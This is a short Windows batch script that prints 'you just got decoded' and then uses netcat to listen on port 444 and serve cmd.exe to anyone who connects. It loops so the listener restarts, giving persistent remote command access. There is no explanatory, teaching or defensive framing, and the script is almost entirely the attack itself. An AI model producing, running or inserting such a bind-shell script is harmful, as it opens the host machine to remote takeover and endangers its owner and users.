@echo off
:menu
echo you just got decoded
nc -nlvp 444 -e cmd.exe

goto :menu